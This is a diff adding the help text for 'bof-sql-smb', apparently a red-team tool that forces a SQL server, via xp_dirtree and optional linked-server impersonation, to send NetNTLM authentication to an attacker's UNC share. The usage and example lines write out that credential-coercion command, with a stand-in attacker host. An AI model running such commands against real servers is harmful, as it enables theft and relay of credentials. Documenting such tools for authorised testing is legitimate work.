@@ -1,0 +1,11 @@
+ABOUT
+    Coerces NetNTLM authentication from SQL server via xp_dirtree to a UNC listener.
+
+USAGE:
+    bof-sql-smb --- <server> [database] [linkedserver] [impersonate] <unc_listener>
+
+ARGUMENTS:
+    unc_listener    UNC path (e.g. \\\\attacker\\share)
+
+EXAMPLES:
+    bof-sql-smb --- SQL01 master LINKED01 dbo \\\\10.0.0.1\\share
